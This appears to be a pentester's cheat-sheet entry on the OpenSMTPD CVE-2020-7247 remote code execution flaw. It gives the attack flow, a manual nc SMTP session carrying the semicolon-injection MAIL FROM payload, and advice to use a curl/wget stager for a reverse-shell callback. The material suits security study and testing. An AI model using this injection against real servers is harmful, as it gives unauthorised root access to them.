# OpenSMTPD CVE-2020-7247 — Unauthenticated RCE

OpenSMTPD ≤ 6.6.2. No auth required. Exploitable since 2018, disclosed 2020. Semicolon injection in the sender field of the `MAIL FROM` command breaks out of the recording function and executes arbitrary shell commands. 64-character limit on the injected command.

Runs as root (listening on port 25 requires root → service inherits those privs) → shell executes as root.

Attack flow: establish SMTP connection → compose email with malicious `MAIL FROM` field → `MAIL FROM: <;cmd;@domain.com>` → semicolon interrupts parsing → command executes with elevated privs → callback to your host.

Exploit is on Exploit-DB. Interact manually or automate:

```bash
# manual SMTP interaction to test
nc <TARGET> 25
EHLO test
MAIL FROM: <;cmd;@test.com>
RCPT TO: <user@target.com>
DATA
.
```

> [!warning] 64-character command limit. Use a short stager (curl/wget a script, then execute) rather than trying to fit a full reverse shell inline.

> [!tip] Verify OpenSMTPD version before attempting — `banner grab` from Nmap or `nc <TARGET> 25` shows the version. Shodan confirms this service is common on Debian/Fedora/FreeBSD infrastructure.